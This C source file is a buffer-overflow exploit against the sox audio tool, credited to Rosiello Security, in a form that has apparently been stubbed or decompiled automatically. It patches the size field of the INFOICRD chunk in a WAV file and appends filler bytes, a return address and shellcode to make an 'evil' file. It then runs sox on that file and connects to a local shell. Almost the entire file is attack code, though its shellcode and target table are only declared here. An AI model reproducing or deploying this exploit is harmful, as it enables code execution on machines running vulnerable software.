#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  scalar_t__ pid_t ;
typedef  int /*<<< orphan*/  payload ;
struct TYPE_2__ {int /*<<< orphan*/  ret; } ;

/* Variables and functions */
 int EXIT_SUCCESS ; 
 int O_CREAT ; 
 int /*<<< orphan*/  O_RDWR ; 
 int O_TRUNC ; 
 int O_WRONLY ; 
 int atoi (char*) ; 
 int /*<<< orphan*/  close (int) ; 
 scalar_t__ connect_to (char*) ; 
 int /*<<< orphan*/  execl (char*,char*,char*,char*,char*,char*,int /*<<< orphan*/ *) ; 
 scalar_t__ fork () ; 
 char* fs_io (char*,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int*) ; 
 scalar_t__ malloc (int) ; 
 char* memap ; 
 int /*<<< orphan*/  memset (char*,int,int) ; 
 int open (char*,int,int) ; 
 int /*<<< orphan*/  perror (char*) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int /*<<< orphan*/  shellcode ; 
 int /*<<< orphan*/  sleep (int) ; 
 int sprintf (char*,char*,char*,int /*<<< orphan*/ ) ; 
 scalar_t__ strncmp (char*,char*,int) ; 
 TYPE_1__* target ; 
 int /*<<< orphan*/  usage (char*) ; 
 int /*<<< orphan*/  write (int,char*,int) ; 

int main(int argc, char **argv)
{

  char *ptr,*tmp;
  int fd,count;
  long sizefield,sizeloc;
  int size;
  char payload[500];
  pid_t pid;
  int opt;
  if ((argc) != 4)
    usage(argv[0]);
  opt=atoi(argv[3]);

  memap = fs_io(argv[1],NULL,O_RDWR,&size);

  printf("[+] Sox Exploiter by Rosiello Security\n");
  printf("[+] Opened %s size : %d\n",argv[1],size);


  ptr = memap;
  count =0;
  do
  {
   ptr++;
   if ((strncmp("INFOICRD",ptr,8)==0)) break;

  } while ( (count ++ !=size) );

  tmp = (char *)malloc ( size + 512);
  tmp = memap;

  ptr +=8;
  sizefield = (long) ptr[0];
  sizeloc = (long) (count + 8)+1;

  tmp[sizeloc]=01;
  tmp[sizeloc+1]=02;

  if ((fd=open ( argv[2] , O_WRONLY | O_CREAT | O_TRUNC,0666)) == -1) {
   perror("open");
   return -1;
  }

  sizeloc +=2;
  write(fd,tmp,sizeloc);

  memset(payload,0x2e,318);

  size=sprintf(payload+318,"%s%s",((char *)&target[opt].ret),shellcode);


  write (fd,payload,sizeof(payload));
  close(fd);

  size = 0x0102 - size;

  printf("[+] Coded by rave & Angelo Rosiello\n");
  printf("[+] Writing evil code into %s\n", argv[2]);
  printf("[+] Org sizefield = %d new sizefield = %d\n",sizefield,0x0102);
  printf("[+] Overflowing the buffer with %d Bytes\n",size);
  printf("[+] Executing /usr/bin/sox\n");
  printf("[+] Connecting to localhost\n");

  pid = fork();
  if (pid ==0) {
    execl("/usr/bin/sox","sox",argv[2],"-t","ossdsp","/dev/dsp" ,NULL);

   };

  sleep(1);
  if ((connect_to("127.0.0.1")) <0)
    printf("[-] Exploit failed\n");

  return EXIT_SUCCESS;
}